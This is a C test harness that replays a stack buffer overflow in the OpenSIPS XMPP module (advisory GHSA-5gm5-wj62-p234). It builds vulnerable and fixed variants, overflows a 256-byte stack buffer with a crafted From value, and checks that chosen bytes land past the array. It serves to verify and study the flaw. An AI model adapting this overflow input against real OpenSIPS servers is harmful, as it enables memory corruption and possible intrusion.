/* Replay driver for OpenSIPS XMPP ENC_SIP_URI stack overflow
 * (GHSA-5gm5-wj62-p234).  gen_encoded.h and gen_call.h contain VERBATIM
 * pinned lines from modules/xmpp/xmpp.h and modules/xmpp/xmpp.c:
 * tag 4.0.1 (vulnerable) or tag 4.0.2 / fix commit ec24165 (fixed).
 * Collaborators are stubbed; no daemon, socket, XML parser or network is used.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stddef.h>

#define MAX_URI_SIZE 1024 /* pinned config.h:76 */
#define CRLF "\r\n"

static int g_rejected;
#define LM_ERR(...) do { g_rejected = 1; } while (0)
#define LM_DBG(...) ((void)0)

typedef struct str { char *s; int len; } str;

#include "gen_encoded.h"

static char from_buf[2048];
static char to_buf[] = "victim@sip.domain";
static char msg_buf[] = "hi";

static int replay(const char *mode)
{
  char *from = from_buf, *to = to_buf, *msg = msg_buf;
  (void)to; (void)msg;
  g_rejected = 0;

#include "gen_call.h"



  /* Instrumentation below this point is NOT upstream source. */
  {
    size_t written = strlen(buf_from);
    size_t overflow = written >= sizeof buf_from ? written - sizeof buf_from + 1 : 0;
    printf("LAYOUT build=%s mode=%s buflen=%zu fromlen=%zu written=%zu overflow=%zu stored_len=%d\n",
#ifdef VULN_BUILD
           "vuln",
#else
           "fixed",
#endif
           mode, sizeof buf_from, strlen(from_buf), written, overflow,
           fromstr.len);
    if (strcmp(mode, "chosen") == 0) {
      /* Read the instrumented bytes immediately past the 256-byte array in
       * the non-ASan build.  This is an observation of this test frame, not
       * a claim about the layout of a shipping OpenSIPS stack. */
      unsigned char observed[16], expected[16];
      size_t i;
      for (i = 0; i < 16; i++) {
        observed[i] = (unsigned char)*(buf_from + 256 + i);
        expected[i] = (unsigned char)from_buf[252 + i];
      }
      printf("CHOSEN observed=");
      for (i = 0; i < 16; i++) printf("%02x", observed[i]);
      printf("\nCHOSEN expected=");
      for (i = 0; i < 16; i++) printf("%02x", expected[i]);
      printf("\nCHOSEN_MATCH=%d\n", memcmp(observed, expected, 16) == 0 ? 1 : 0);
    }
    (void)hdr; (void)tostr; (void)msgstr; (void)msg_type;
  }
  return 0;
}
int main(int argc, char **argv)
{
  const char *mode = argc > 1 ? argv[1] : "chosen";
  size_t len, i;

  if (strcmp(mode, "long") == 0) len = 1020; /* fixed build: exactly fits */
  else if (strcmp(mode, "over") == 0) len = 1500; /* fixed build: rejected */
  else if (strcmp(mode, "slash") == 0) len = 299;
  else len = 299; /* 4-byte prefix + 299 bytes + NUL = 304 into 256 */

  for (i = 0; i < len; i++) from_buf[i] = (char)('A' + (i % 26));
  from_buf[len] = '\0';
  if (strcmp(mode, "slash") == 0) from_buf[10] = '/';

  if (replay(mode) == -1)
    printf("LAYOUT build=fixed mode=%s rejected=1 buflen=1025\n", mode);
  return 0;
}
